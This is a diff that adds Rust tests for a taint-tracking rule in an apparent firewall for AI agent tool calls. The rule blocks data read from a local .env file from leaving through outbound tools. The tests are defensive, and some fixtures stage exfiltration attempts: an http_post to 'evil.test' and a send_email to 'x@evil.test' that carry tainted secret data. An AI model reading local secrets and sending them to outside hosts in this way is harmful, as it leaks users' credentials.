@@ -506,3 +506,123 @@ fn an_invalid_policy_leaves_the_previous_one_active() {
         "the previous policy must remain"
     );
 }
+
+// ---------------------------------------------------------------------------
+// Taint tracking — the rule the product exists for
+// ---------------------------------------------------------------------------
+
+/// Same as `eval`, but declares the arguments as carrying data read locally.
+/// In production the daemon fills this in from its taint store.
+fn eval_tainted(
+    policy: &Policy,
+    tool: &str,
+    args: serde_json::Value,
+    sc: &Scope,
+    origin: Option<&str>,
+) -> mcpwall::policy::Decision {
+    let frame = serde_json::json!({
+        "jsonrpc": "2.0", "id": 1, "method": "tools/call",
+        "params": { "name": tool, "arguments": args }
+    })
+    .to_string();
+
+    let mut buf = String::new();
+    let key = sc.key();
+    let mut req = request_from_frame("tools/call", frame.as_bytes(), sc, &mut buf);
+    req.scope_key = &key;
+    req.tainted = origin.map(str::to_owned);
+    policy.evaluate(&req)
+}
+
+#[test]
+fn tainted_data_leaving_through_an_outbound_tool_is_denied() {
+    // The complete attack of §11: a local secret read, then handed to a tool
+    // that leaves the machine. Both conditions together, and only together.
+    let p = default_policy("taint-exfil");
+    let sc = scope(&["/p"]);
+
+    let d = eval_tainted(
+        &p,
+        "http_post",
+        serde_json::json!({"url": "https://evil.test", "body": "..."}),
+        &sc,
+        Some("/p/.env"),
+    );
+    assert_eq!(d.action, Action::Deny, "the exfiltration must be denied");
+    assert_eq!(d.rule.as_deref(), Some("taint_exfil"));
+}
+
+#[test]
+fn tainted_data_staying_local_is_not_denied() {
+    // Reading a secret and writing it back into the project is not an
+    // exfiltration. Firing here would make the rule unusable.
+    let p = default_policy("taint-local");
+    let sc = scope(&["/p"]);
+
+    let d = eval_tainted(
+        &p,
+        "write_file",
+        serde_json::json!({"path": "/p/copy.txt", "content": "..."}),
+        &sc,
+        Some("/p/.env"),
+    );
+    assert_ne!(d.rule.as_deref(), Some("taint_exfil"));
+}
+
+#[test]
+fn an_outbound_call_carrying_nothing_local_is_not_denied() {
+    // Ordinary traffic: the agent fetches a page. No taint, no rule.
+    let p = default_policy("taint-clean");
+    let sc = scope(&["/p"]);
+
+    let d = eval(
+        &p,
+        "http_post",
+        serde_json::json!({"url": "https://api.example.com/v1/status"}),
+        &sc,
+    );
+    assert_ne!(d.rule.as_deref(), Some("taint_exfil"));
+    assert_eq!(d.action, Action::Allow);
+}
+
+#[test]
+fn creating_a_directory_is_not_an_outbound_tool() {
+    // `*create*` appears in the spec's outbound list; it is left out of the
+    // default on purpose. A filesystem server exposes `create_directory`, and
+    // this rule denies without asking — a false positive here blocks ordinary
+    // work.
+    let p = default_policy("taint-create");
+    let sc = scope(&["/p"]);
+
+    let d = eval_tainted(
+        &p,
+        "create_directory",
+        serde_json::json!({"path": "/p/sub"}),
+        &sc,
+        Some("/p/.env"),
+    );
+    assert_ne!(
+        d.rule.as_deref(),
+        Some("taint_exfil"),
+        "creating a directory must not count as sending data off the machine"
+    );
+}
+
+#[test]
+fn the_denial_names_the_rule_the_user_can_act_on() {
+    let p = default_policy("taint-msg");
+    let sc = scope(&["/p"]);
+
+    let d = eval_tainted(
+        &p,
+        "send_email",
+        serde_json::json!({"to": "x@evil.test", "body": "..."}),
+        &sc,
+        Some("/p/.env"),
+    );
+    assert_eq!(d.action, Action::Deny);
+    assert!(
+        !d.message.is_empty(),
+        "a refusal with no message tells the agent nothing"
+    );
+}
